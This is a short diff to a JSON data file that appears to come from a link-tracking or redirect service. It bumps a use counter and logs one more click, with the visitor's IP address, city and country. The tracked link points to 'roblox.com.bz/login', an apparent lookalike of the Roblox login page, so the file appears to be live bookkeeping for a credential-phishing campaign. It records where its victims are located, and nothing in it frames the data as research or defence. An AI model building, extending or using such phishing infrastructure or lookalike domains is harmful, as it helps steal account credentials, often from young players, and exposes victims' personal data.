@@ -14161,7 +14161,7 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 14,
+    "useCount": 15,
     "createdBy": "admin",
     "clicks": [
       {
@@ -14275,6 +14275,14 @@
         "city": "Ulan Bator",
         "flag": "🇲🇳",
         "countryCode": "MN"
+      },
+      {
+        "timestamp": 1778894628079,
+        "ip": "45.168.174.72",
+        "country": "Venezuela",
+        "city": "Maturín",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
       }
     ]
   },
